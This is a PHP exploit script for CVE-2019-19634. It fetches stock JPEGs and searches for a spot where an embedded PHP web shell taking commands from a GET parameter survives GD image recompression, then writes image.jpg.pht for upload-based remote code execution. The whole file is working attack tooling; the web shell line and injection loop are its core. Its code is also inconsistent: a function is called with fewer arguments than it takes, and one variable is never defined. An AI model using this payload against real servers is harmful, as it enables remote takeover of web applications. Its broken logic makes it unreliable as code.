<?php
#Title: jpeg payload generator for file upload RCE
#Author: Jinny Ramsmark
#Github: https://github.com/jra89/CVE-2019-19634
#Other: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19634
#Usage: php inject.php
#Output: image.jpg.pht is the file to be used for upload and exploitation

#This script assumes no special transforming is done on the image for this specific CVE.
#It can be modified however for different sizes and so on (x,y vars).
#The plan is to give this script its own repository soon and make it into a more dynamic tool

ini_set('display_errors', 1);
error_reporting(E_PARSE);
#requires php, php-gd
 
$orig = 'image.jpg';
$code = '<?=exec($_GET["c"])?>';
$quality = "85";
$base_url = "http://lorempixel.com";
$output = 'image.jpg.pht';
 
echo "-=Imagejpeg injector 1.8=-\n";
 
do
{
    $x = 100;
    $y = 100;
    $url = $base_url . "/$x/$y/";
 
    echo "[+] Fetching image ($x X $y) from $url\n";
    file_put_contents($orig, file_get_contents($url));
} while(!tryInject($orig, $code, $quality));
 
echo "[+] It seems like it worked!\n";
echo "[+] Result file: $output\n";
 
function tryInject($orig, $code, $quality, $output)
{
    $tmp_filename = $orig . '_mod2.jpg';
    
    //Create base image and load its data
    $src = imagecreatefromjpeg($orig);

    imagejpeg($src, $tmp_filename, $quality);
    $data = file_get_contents($tmp_filename);
    $tmpData = array();

    echo "[+] Jumping to end byte\n";
    $start_byte = findStart($data);
 
    echo "[+] Searching for valid injection point\n";
    for($i = strlen($data)-1; $i > $start_byte; --$i)
    {
        $tmpData = $data;
        for($n = $i, $z = (strlen($code)-1); $z >= 0; --$z, --$n)
        {
            $tmpData[$n] = $code[$z];
        }
 
        $src = imagecreatefromstring($tmpData);
        imagejpeg($src, $output, $quality);
 
        if(checkCodeInFile($result_file, $code))
        {
            unlink($tmp_filename);
            unlink($result_file);
            sleep(1);
 
            file_put_contents($result_file, $tmpData);
            echo "[!] Temp solution, if you get a 'recoverable parse error' here, it means it probably failed\n";
 
            sleep(1);
            $src = imagecreatefromjpeg($result_file);
 
            return true;
        }
        else
        {
            unlink($output);
        }
    }
        unlink($orig);
        unlink($tmp_filename);
        return false;
}
 
function findStart($str)
{
    for($i = 0; $i < strlen($str); ++$i)
    {
        if(ord($str[$i]) == 0xFF && ord($str[$i+1]) == 0xDA)
        {
            return $i+2;
        }
    }
 
    return -1;
}
 
function checkCodeInFile($file, $code)
{
    if(file_exists($file))
    {
        $contents = loadFile($file);
    }
    else
    {
        $contents = "0";
    }
 
    return strstr($contents, $code);
}
 
function loadFile($file)
{
    $handle = fopen($file, "r");
    $buffer = fread($handle, filesize($file));
    fclose($handle);
 
    return $buffer;
}
